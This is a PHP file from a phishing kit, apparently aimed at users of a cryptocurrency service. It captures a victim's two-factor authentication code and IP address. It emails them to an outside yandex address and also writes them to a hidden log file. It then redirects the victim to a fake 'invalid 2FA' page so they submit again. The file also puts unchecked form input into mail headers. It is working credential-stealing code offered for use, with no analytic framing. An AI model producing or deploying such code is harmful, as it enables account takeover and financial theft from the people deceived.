<?php


/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$code   = $_POST['code'];
/*========== [ Variables ]==========*/


$message = "
==$$$==== *** s3MpaK.B4nK***=====$$$==
2Fa      : $code
==$$$==== *** s3MpaK.B4nK***=====$$$==
IP	: http://www.geoiptool.com/?IP=$ip
==========[ THANK'S YOU ]==========";


$to = "result.netnot@yandex.com"; // Email Here
$subject = "BTC = [$ip]";
$headers = "From: coinsph <result.netnot@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);

$file = "----<<3C3Cdftyceertgyrykfh>>----";
$code   = $_POST['code'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "---------------------------------------");
fwrite($handle, "\n");
fwrite($handle, "::  2Fa         ::   ");
fwrite($handle, "$code");
fwrite($handle, "\n");
fwrite($handle, "::  IP          ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"/invalid2fa.html\";
// -->
</script>";
?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

?>


